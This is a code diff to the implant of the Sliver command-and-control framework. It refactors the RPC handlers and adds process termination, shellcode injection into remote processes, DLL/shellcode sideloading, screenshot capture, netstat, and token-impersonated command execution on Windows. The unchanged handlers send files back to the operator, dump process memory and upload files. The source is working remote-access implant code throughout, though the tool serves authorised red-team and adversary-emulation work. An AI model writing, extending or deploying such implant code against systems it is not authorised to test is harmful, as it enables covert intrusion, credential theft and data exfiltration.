@@ -33,26 +33,30 @@ import (
 	"log"
 	// {{end}}
 
+	// {{if eq .GOOS "windows"}}
+	"syscall"
+
+	"github.com/bishopfox/sliver/sliver/priv"
+	"golang.org/x/sys/windows"
+
+	// {{end}}
+
 	"os"
 	"path/filepath"
 
-	pb "github.com/bishopfox/sliver/protobuf/sliver"
+	"github.com/bishopfox/sliver/protobuf/commonpb"
+	"github.com/bishopfox/sliver/protobuf/sliverpb"
+	"github.com/bishopfox/sliver/sliver/netstat"
 	"github.com/bishopfox/sliver/sliver/procdump"
 	"github.com/bishopfox/sliver/sliver/ps"
+	screen "github.com/bishopfox/sliver/sliver/sc"
 	"github.com/bishopfox/sliver/sliver/taskrunner"
 
 	"github.com/golang/protobuf/proto"
 )
 
-// func killHandler(data []byte, resp RPCResponse) {
-// 	// {{if .Debug}}
-// 	log.Printf("Received kill command")
-// 	// {{end}}
-// 	os.Exit(0)
-// }
-
 func pingHandler(data []byte, resp RPCResponse) {
-	ping := &pb.Ping{}
+	ping := &sliverpb.Ping{}
 	err := proto.Unmarshal(data, ping)
 	if err != nil {
 		// {{if .Debug}}
@@ -68,7 +72,7 @@ func pingHandler(data []byte, resp RPCResponse) {
 }
 
 func psHandler(data []byte, resp RPCResponse) {
-	psListReq := &pb.PsReq{}
+	psListReq := &sliverpb.PsReq{}
 	err := proto.Unmarshal(data, psListReq)
 	if err != nil {
 		// {{if .Debug}}
@@ -83,12 +87,12 @@ func psHandler(data []byte, resp RPCResponse) {
 		// {{end}}
 	}
 
-	psList := &pb.Ps{
-		Processes: []*pb.Process{},
+	psList := &sliverpb.Ps{
+		Processes: []*commonpb.Process{},
 	}
 
 	for _, proc := range procs {
-		psList.Processes = append(psList.Processes, &pb.Process{
+		psList.Processes = append(psList.Processes, &commonpb.Process{
 			Pid:        int32(proc.Pid()),
 			Ppid:       int32(proc.PPid()),
 			Executable: proc.Executable(),
@@ -99,8 +103,41 @@ func psHandler(data []byte, resp RPCResponse) {
 	resp(data, err)
 }
 
+func terminateHandler(data []byte, resp RPCResponse) {
+
+	terminateReq := &sliverpb.TerminateReq{}
+	err := proto.Unmarshal(data, terminateReq)
+	if err != nil {
+		// {{if .Debug}}
+		log.Printf("error decoding message: %v", err)
+		// {{end}}
+		return
+	}
+
+	var errStr string
+	if int(terminateReq.Pid) <= 1 && !terminateReq.Force {
+		errStr = "Cowardly refusing to terminate process without force"
+	} else {
+		err = ps.Kill(int(terminateReq.Pid))
+		if err != nil {
+			// {{if .Debug}}
+			log.Printf("Failed to kill process %s", err)
+			// {{end}}
+			errStr = err.Error()
+		}
+	}
+
+	data, err = proto.Marshal(&sliverpb.Terminate{
+		Pid: terminateReq.Pid,
+		Response: &commonpb.Response{
+			Err: errStr,
+		},
+	})
+	resp(data, err)
+}
+
 func dirListHandler(data []byte, resp RPCResponse) {
-	dirListReq := &pb.LsReq{}
+	dirListReq := &sliverpb.LsReq{}
 	err := proto.Unmarshal(data, dirListReq)
 	if err != nil {
 		// {{if .Debug}}
@@ -111,15 +148,15 @@ func dirListHandler(data []byte, resp RPCResponse) {
 	dir, files, err := getDirList(dirListReq.Path)
 
 	// Convert directory listing to protobuf
-	dirList := &pb.Ls{Path: dir}
+	dirList := &sliverpb.Ls{Path: dir}
 	if err == nil {
 		dirList.Exists = true
 	} else {
 		dirList.Exists = false
 	}
-	dirList.Files = []*pb.FileInfo{}
+	dirList.Files = []*sliverpb.FileInfo{}
 	for _, fileInfo := range files {
-		dirList.Files = append(dirList.Files, &pb.FileInfo{
+		dirList.Files = append(dirList.Files, &sliverpb.FileInfo{
 			Name:  fileInfo.Name(),
 			IsDir: fileInfo.IsDir(),
 			Size:  fileInfo.Size(),
@@ -141,7 +178,7 @@ func getDirList(target string) (string, []os.FileInfo, error) {
 }
 
 func rmHandler(data []byte, resp RPCResponse) {
-	rmReq := &pb.RmReq{}
+	rmReq := &sliverpb.RmReq{}
 	err := proto.Unmarshal(data, rmReq)
 	if err != nil {
 		// {{if .Debug}}
@@ -150,21 +187,31 @@ func rmHandler(data []byte, resp RPCResponse) {
 		return
 	}
 
-	rm := &pb.Rm{}
+	rm := &sliverpb.Rm{}
 	target, _ := filepath.Abs(rmReq.Path)
 	rm.Path = target
 	_, err = os.Stat(target)
 	if err == nil {
-		err = os.RemoveAll(target)
-		if err == nil {
-			rm.Success = true
+		if (target == "/" || target == "C:\\") && !rmReq.Force {
+			err = errors.New("Cowardly refusing to remove volume root without force")
+		}
+	}
+
+	rm.Response = &commonpb.Response{}
+	if err == nil {
+		if rmReq.Recursive {
+			err = os.RemoveAll(target)
+			if err != nil {
+				rm.Response.Err = err.Error()
+			}
 		} else {
-			rm.Success = false
-			rm.Err = fmt.Sprintf("%v", err)
+			err = os.Remove(target)
+			if err != nil {
+				rm.Response.Err = err.Error()
+			}
 		}
 	} else {
-		rm.Success = false
-		rm.Err = fmt.Sprintf("%v", err)
+		rm.Response.Err = err.Error()
 	}
 
 	data, err = proto.Marshal(rm)
@@ -172,7 +219,7 @@ func rmHandler(data []byte, resp RPCResponse) {
 }
 
 func mkdirHandler(data []byte, resp RPCResponse) {
-	mkdirReq := &pb.MkdirReq{}
+	mkdirReq := &sliverpb.MkdirReq{}
 	err := proto.Unmarshal(data, mkdirReq)
 	if err != nil {
 		// {{if .Debug}}
@@ -181,24 +228,22 @@ func mkdirHandler(data []byte, resp RPCResponse) {
 		return
 	}
 
-	mkdir := &pb.Mkdir{}
+	mkdir := &sliverpb.Mkdir{}
 	target, _ := filepath.Abs(mkdirReq.Path)
 	mkdir.Path = target
 
-	err = os.MkdirAll(target, os.ModePerm)
-	if err == nil {
-		mkdir.Success = true
-	} else {
-		mkdir.Success = false
-		mkdir.Err = fmt.Sprintf("%v", err)
+	err = os.MkdirAll(target, 0700)
+	if err != nil {
+		mkdir.Response = &commonpb.Response{
+			Err: err.Error(),
+		}
 	}
-
 	data, err = proto.Marshal(mkdir)
 	resp(data, err)
 }
 
 func cdHandler(data []byte, resp RPCResponse) {
-	cdReq := &pb.CdReq{}
+	cdReq := &sliverpb.CdReq{}
 	err := proto.Unmarshal(data, cdReq)
 	if err != nil {
 		// {{if .Debug}}
@@ -210,7 +255,7 @@ func cdHandler(data []byte, resp RPCResponse) {
 
 	os.Chdir(cdReq.Path)
 	dir, err := os.Getwd()
-	pwd := &pb.Pwd{Path: dir}
+	pwd := &sliverpb.Pwd{Path: dir}
 	if err != nil {
 		resp([]byte{}, err)
 		return
@@ -225,7 +270,7 @@ func cdHandler(data []byte, resp RPCResponse) {
 }
 
 func pwdHandler(data []byte, resp RPCResponse) {
-	pwdReq := &pb.PwdReq{}
+	pwdReq := &sliverpb.PwdReq{}
 	err := proto.Unmarshal(data, pwdReq)
 	if err != nil {
 		// {{if .Debug}}
@@ -236,9 +281,11 @@ func pwdHandler(data []byte, resp RPCResponse) {
 	}
 
 	dir, err := os.Getwd()
-	pwd := &pb.Pwd{Path: dir}
+	pwd := &sliverpb.Pwd{Path: dir}
 	if err != nil {
-		pwd.Err = fmt.Sprintf("%v", err)
+		pwd.Response = &commonpb.Response{
+			Err: err.Error(),
+		}
 	}
 
 	data, err = proto.Marshal(pwd)
@@ -248,7 +295,7 @@ func pwdHandler(data []byte, resp RPCResponse) {
 // Send a file back to the hive
 func downloadHandler(data []byte, resp RPCResponse) {
 	var rawData []byte
-	downloadReq := &pb.DownloadReq{}
+	downloadReq := &sliverpb.DownloadReq{}
 	err := proto.Unmarshal(data, downloadReq)
 	if err != nil {
 		// {{if .Debug}}
@@ -269,23 +316,29 @@ func downloadHandler(data []byte, resp RPCResponse) {
 	if fi.IsDir() {
 		var dirData bytes.Buffer
 		err = compressDir(target, &dirData)
+		// {{if .Debug}}
+		log.Printf("error creating the archive: %v", err)
+		// {{end}}
 		rawData = dirData.Bytes()
 	} else {
 		rawData, err = ioutil.ReadFile(target)
 	}
 
-	var download *pb.Download
+	var download *sliverpb.Download
 	if err == nil {
 		gzipData := bytes.NewBuffer([]byte{})
 		gzipWrite(gzipData, rawData)
-		download = &pb.Download{
+		download = &sliverpb.Download{
 			Path:    target,
 			Data:    gzipData.Bytes(),
 			Encoder: "gzip",
 			Exists:  true,
 		}
 	} else {
-		download = &pb.Download{Path: target, Exists: false}
+		download = &sliverpb.Download{Path: target, Exists: false}
+		download.Response = &commonpb.Response{
+			Err: fmt.Sprintf("%v", err),
+		}
 	}
 
 	data, _ = proto.Marshal(download)
@@ -293,7 +346,7 @@ func downloadHandler(data []byte, resp RPCResponse) {
 }
 
 func uploadHandler(data []byte, resp RPCResponse) {
-	uploadReq := &pb.UploadReq{}
+	uploadReq := &sliverpb.UploadReq{}
 	err := proto.Unmarshal(data, uploadReq)
 	if err != nil {
 		// {{if .Debug}}
@@ -304,20 +357,22 @@ func uploadHandler(data []byte, resp RPCResponse) {
 	}
 
 	uploadPath, _ := filepath.Abs(uploadReq.Path)
-	upload := &pb.Upload{Path: uploadPath}
+	upload := &sliverpb.Upload{Path: uploadPath}
 	f, err := os.Create(uploadPath)
 	if err != nil {
-		upload.Err = fmt.Sprintf("%v", err)
-		upload.Success = false
+		upload.Response = &commonpb.Response{
+			Err: fmt.Sprintf("%v", err),
+		}
+
 	} else {
 		defer f.Close()
 		data, err := gzipRead(uploadReq.Data)
 		if err != nil {
-			upload.Err = fmt.Sprintf("%v", err)
-			upload.Success = false
+			upload.Response = &commonpb.Response{
+				Err: fmt.Sprintf("%v", err),
+			}
 		} else {
 			f.Write(data)
-			upload.Success = true
 		}
 	}
 
@@ -326,7 +381,7 @@ func uploadHandler(data []byte, resp RPCResponse) {
 }
 
 func dumpHandler(data []byte, resp RPCResponse) {
-	procDumpReq := &pb.ProcessDumpReq{}
+	procDumpReq := &sliverpb.ProcessDumpReq{}
 	err := proto.Unmarshal(data, procDumpReq)
 	if err != nil {
 		// {{if .Debug}}
@@ -335,19 +390,20 @@ func dumpHandler(data []byte, resp RPCResponse) {
 		return
 	}
 	res, err := procdump.DumpProcess(procDumpReq.Pid)
-	dumpResp := &pb.ProcessDump{Data: res.Data()}
-	if err == nil {
-		dumpResp.Err = ""
-	} else {
-		dumpResp.Err = fmt.Sprintf("%v", err)
+	dumpResp := &sliverpb.ProcessDump{Data: res.Data()}
+	if err != nil {
+		dumpResp.Response = &commonpb.Response{
+			Err: fmt.Sprintf("%v", err),
+		}
 	}
 	data, err = proto.Marshal(dumpResp)
 	resp(data, err)
 }
 
 func taskHandler(data []byte, resp RPCResponse) {
-	task := &pb.Task{}
-	err := proto.Unmarshal(data, task)
+	var err error
+	task := &sliverpb.TaskReq{}
+	err = proto.Unmarshal(data, task)
 	if err != nil {
 		// {{if .Debug}}
 		log.Printf("error decoding message: %v", err)
@@ -355,21 +411,33 @@ func taskHandler(data []byte, resp RPCResponse) {
 		return
 	}
 
-	err = taskrunner.LocalTask(task.Data, task.RWXPages)
+	if task.Pid == 0 {
+		err = taskrunner.LocalTask(task.Data, task.RWXPages)
+	} else {
+		err = taskrunner.RemoteTask(int(task.Pid), task.Data, task.RWXPages)
+	}
 	resp([]byte{}, err)
 }
 
-func remoteTaskHandler(data []byte, resp RPCResponse) {
-	remoteTask := &pb.RemoteTask{}
-	err := proto.Unmarshal(data, remoteTask)
+func sideloadHandler(data []byte, resp RPCResponse) {
+	sideloadReq := &sliverpb.SideloadReq{}
+	err := proto.Unmarshal(data, sideloadReq)
 	if err != nil {
-		// {{if .Debug}}
-		log.Printf("error decoding message: %v", err)
-		// {{end}}
 		return
 	}
-	err = taskrunner.RemoteTask(int(remoteTask.Pid), remoteTask.Data, remoteTask.RWXPages)
-	resp([]byte{}, err)
+	result, err := taskrunner.Sideload(sideloadReq.GetProcessName(), sideloadReq.GetData(), sideloadReq.GetArgs())
+	errStr := ""
+	if err != nil {
+		errStr = err.Error()
+	}
+	sideloadResp := &sliverpb.Sideload{
+		Result: result,
+		Response: &commonpb.Response{
+			Err: errStr,
+		},
+	}
+	data, err = proto.Marshal(sideloadResp)
+	resp(data, err)
 }
 
 func ifconfigHandler(_ []byte, resp RPCResponse) {
@@ -381,17 +449,17 @@ func ifconfigHandler(_ []byte, resp RPCResponse) {
 	resp(data, err)
 }
 
-func ifconfig() *pb.Ifconfig {
+func ifconfig() *sliverpb.Ifconfig {
 	netInterfaces, err := net.Interfaces()
 	if err != nil {
 		return nil
 	}
 
-	interfaces := &pb.Ifconfig{
-		NetInterfaces: []*pb.NetInterface{},
+	interfaces := &sliverpb.Ifconfig{
+		NetInterfaces: []*sliverpb.NetInterface{},
 	}
 	for _, iface := range netInterfaces {
-		netIface := &pb.NetInterface{
+		netIface := &sliverpb.NetInterface{
 			Index: int32(iface.Index),
 			Name:  iface.Name,
 		}
@@ -414,7 +482,7 @@ func executeHandler(data []byte, resp RPCResponse) {
 		err error
 		cmd *exec.Cmd
 	)
-	execReq := &pb.ExecuteReq{}
+	execReq := &sliverpb.ExecuteReq{}
 	err = proto.Unmarshal(data, execReq)
 	if err != nil {
 		// {{if .Debug}}
@@ -422,29 +490,168 @@ func executeHandler(data []byte, resp RPCResponse) {
 		// {{end}}
 		return
 	}
-	execResp := &pb.Execute{}
-	cmd = exec.Command(execReq.Path)
+	execResp := &sliverpb.Execute{}
 	if len(execReq.Args) != 0 {
-		cmd.Args = execReq.Args
+		cmd = exec.Command(execReq.Path, execReq.Args...)
+	} else {
+		cmd = exec.Command(execReq.Path)
 	}
+	//{{if eq .GOOS "windows"}}
+	cmd.SysProcAttr = &windows.SysProcAttr{
+		Token: syscall.Token(priv.CurrentToken),
+	}
+	//{{end}}
+
 	if execReq.Output {
 		res, err := cmd.Output()
 		//{{if .Debug}}
 		log.Println(string(res))
 		//{{end}}
 		if err != nil {
-			execResp.Error = err.Error()
+			execResp.Response = &commonpb.Response{
+				Err: fmt.Sprintf("%s", err),
+			}
 		} else {
 			execResp.Result = string(res)
 		}
 	} else {
 		err = cmd.Start()
 		if err != nil {
-			execResp.Error = err.Error()
+			execResp.Response = &commonpb.Response{
+				Err: fmt.Sprintf("%s", err),
+			}
 		}
 	}
 	data, err = proto.Marshal(execResp)
 	resp(data, err)
+}
+
+func screenshotHandler(data []byte, resp RPCResponse) {
+	sc := &sliverpb.Screenshot{}
+	err := proto.Unmarshal(data, sc)
+	if err != nil {
+		// {{if .Debug}}
+		log.Printf("error decoding message: %v", err)
+		// {{end}}
+		return
+	}
+	// {{if .Debug}}
+	log.Printf("Screenshot Request")
+	// {{end}}
+
+	sc.Data = screen.Capture()
+	data, err = proto.Marshal(sc)
+
+	resp(data, err)
+}
+
+func netstatHandler(data []byte, resp RPCResponse) {
+	netstatReq := &sliverpb.NetstatReq{}
+	err := proto.Unmarshal(data, netstatReq)
+	if err != nil {
+		//{{if .Debug}}
+		log.Printf("error decoding message: %v", err)
+		//{{end}}
+		return
+	}
+
+	result := &sliverpb.Netstat{}
+	entries := make([]*sliverpb.SockTabEntry, 0)
+
+	if netstatReq.UDP {
+		if netstatReq.IP4 {
+			tabs, err := netstat.UDPSocks(netstat.NoopFilter)
+			if err != nil {
+				//{{if .Debug}}
+				log.Printf("netstat failed: %v", err)
+				//{{end}}
+				return
+			}
+			entries = append(entries, buildEntries("udp", tabs)...)
+		}
+		if netstatReq.IP6 {
+			tabs, err := netstat.UDP6Socks(netstat.NoopFilter)
+			if err != nil {
+				//{{if .Debug}}
+				log.Printf("netstat failed: %v", err)
+				//{{end}}
+				return
+			}
+			entries = append(entries, buildEntries("udp6", tabs)...)
+		}
+	}
+
+	if netstatReq.TCP {
+		var fn netstat.AcceptFn
+		switch {
+		case netstatReq.Listening:
+			fn = func(s *netstat.SockTabEntry) bool {
+				return s.State == netstat.Listen
+			}
+		default:
+			fn = func(s *netstat.SockTabEntry) bool {
+				return s.State != netstat.Listen
+			}
+		}
+
+		if netstatReq.IP4 {
+			tabs, err := netstat.TCPSocks(fn)
+			if err != nil {
+				//{{if .Debug}}
+				log.Printf("netstat failed: %v", err)
+				//{{end}}
+				return
+			}
+			entries = append(entries, buildEntries("tcp", tabs)...)
+		}
+
+		if netstatReq.IP6 {
+			tabs, err := netstat.TCP6Socks(fn)
+			if err != nil {
+				//{{if .Debug}}
+				log.Printf("netstat failed: %v", err)
+				//{{end}}
+				return
+			}
+			entries = append(entries, buildEntries("tcp6", tabs)...)
+		}
+		result.Entries = entries
+		data, err := proto.Marshal(result)
+		resp(data, err)
+	}
+}
+
+func buildEntries(proto string, s []netstat.SockTabEntry) []*sliverpb.SockTabEntry {
+	entries := make([]*sliverpb.SockTabEntry, 0)
+	for _, e := range s {
+		var (
+			pid  int32
+			exec string
+		)
+		if e.Process != nil {
+			pid = int32(e.Process.Pid)
+			exec = e.Process.Name
+		}
+		entries = append(entries, &sliverpb.SockTabEntry{
+			LocalAddr: &sliverpb.SockTabEntry_SockAddr{
+				Ip:   e.LocalAddr.String(),
+				Port: uint32(e.LocalAddr.Port),
+			},
+			RemoteAddr: &sliverpb.SockTabEntry_SockAddr{
+				Ip:   e.RemoteAddr.String(),
+				Port: uint32(e.RemoteAddr.Port),
+			},
+			SkState: e.State.String(),
+			UID:     e.UID,
+			Process: &commonpb.Process{
+				Pid:        pid,
+				Executable: exec,
+			},
+			Protocol: proto,
+		})
+	}
+	return entries
+
 }
 
 // ---------------- Data Encoders ----------------
@@ -472,11 +679,25 @@ func compressDir(path string, buf io.Writer) error {
 	tarWriter := tar.NewWriter(zipWriter)
 
 	filepath.Walk(path, func(file string, fi os.FileInfo, err error) error {
+		fileName := file
+		// If the file is a SymLink replace fileInfo and path with the symlink destination.
+		if fi.Mode()&os.ModeSymlink == os.ModeSymlink {
+			file, err = filepath.EvalSymlinks(file)
+			if err != nil {
+				return err
+			}
+
+			fi, err = os.Lstat(file)
+			if err != nil {
+				return err
+			}
+		}
 		header, err := tar.FileInfoHeader(fi, file)
 		if err != nil {
 			return err
 		}
-		header.Name = filepath.ToSlash(file)
+		// Keep the symlink file path for the header name.
+		header.Name = filepath.ToSlash(fileName)
 		if err := tarWriter.WriteHeader(header); err != nil {
 			return err
 		}
